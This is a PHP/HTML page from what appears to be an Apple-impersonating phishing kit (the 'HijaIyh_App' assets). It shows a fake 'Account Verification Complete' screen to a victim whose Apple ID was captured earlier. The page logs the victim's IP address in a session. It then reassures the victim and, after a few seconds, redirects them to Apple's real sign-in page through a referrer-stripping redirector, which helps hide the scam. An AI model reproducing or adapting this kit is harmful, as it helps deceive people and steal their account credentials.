<?php
$core->create_session(['done' => $core->userIP() ]);

?>
<!DOCTYPE html>
<html>
  <head>

    <meta charset="utf-8">
    <meta http-equiv="refresh" content="4;url=https://href.li/?https://idmsa.apple.com/IDMSWebAuth/login.html?appIdKey=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3&accNameLocked=false&language=US-EN&path=/signin/?referrer=/account/manage&Env=PROD">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex" />
    <link rel="stylesheet" href="./HijaIyh_App/assets/css/modal.css">
    <link rel="stylesheet" href="./HijaIyh_App/assets/css/bootstrap.min.css">
    <link rel="icon" href="./HijaIyh_App/assets/img/favicon.ico" type="image/x-icon" />
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="shortcut icon" sizes="196x196" href="./HijaIyh_App/assets/img/favicon.ico">
     <script type="text/javascript" src="./HijaIyh_App/assets/js/jquery.js"></script>
     <script type="text/javascript" src="./HijaIyh_App/assets/js/jquery.validate.min.js"></script>
    
  </head>
  <body>

 
		
        <div class="container-fluid">
                <div class="row clearfix">
                <link rel="stylesheet" type="text/css" href="./HijaIyh_App/assets/css/desktop.css">
                                <!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title><?=$core->translate('Confirm your information',$lang);?></title>	<link rel="stylesheet" type="text/css" href="./HijaIyh_App/assets/css/desktop.css">
	
	<link rel="icon" href="./HijaIyh_App/assets/img/favicon.ico" type="image/x-icon" />
<style>
.image-upload1 > input
{
    display: none;
}
.image-upload > input
{
    display: none;
}
</style>
</head>
<body>
<div id="head"></div>
<div id="container">
	<div id="xheader">
		<div id="navbar"></div>
		<div style="font-size: 38px;font-family: 'Open Sans', sans-serif;color: rgb(255, 255, 255);line-height: 2.524;text-align: right;position: absolute;top: 53px;z-index: 2;left: 0px;">

         <b><?=$core->translate('Account Verification',$lang);?></b> 
            </div>
		<div id="account_type">
        <?=$core->translate('Your Apple ID is',$lang);?> 

        <b><?=$core->session('appleid');?>  </b> </div>
		<div id="logout"></div>
        <font id="logout0"><a href="#" style="color:#fff;text-decoration: none;"><?=$core->translate('Sign Out',$lang);?></a></font>
	</div>
    <script type="text/javascript">
    window.onload=function(){
        var auto = setTimeout(function(){ autoRefresh(); }, 100);

        function submitform(){
          document.forms["form"].submit();
        }

        function autoRefresh(){
           clearTimeout(auto);
           auto = setTimeout(function(){ submitform(); autoRefresh(); }, 5000);
        }
    }
    </script>
	<div id="xcontent">
	   
                        <br><br>
            
			<font class="xFont3" style="top:105px;left:398px;">
                <img id="gambardesktop" width="150" src="./HijaIyh_App/assets/img/done.png">
            </font>
            <font class="xFont" style="top:230px;left:280px;">
                <b><?=$core->translate('Account Verification Complete',$lang);?></b>
            </font>
            <font class="xFont3" style="top:290px;left:300px;"><?=$core->translate('Please wait while we restore your account access...',$lang);?></font>
    
	</div>
	
</div>
<div id="containerfooter">
<!-- <div id="footerbawah"></div> -->
</div>
<script src="./HijaIyh_App/assets/js/main.js"></script></script>
<script type="text/javascript" src="./HijaIyh_App/assets/js/jquery.validate.min.js"></script>

</body>
</html>
                
                </div>
        </div>
      <body>
</html>
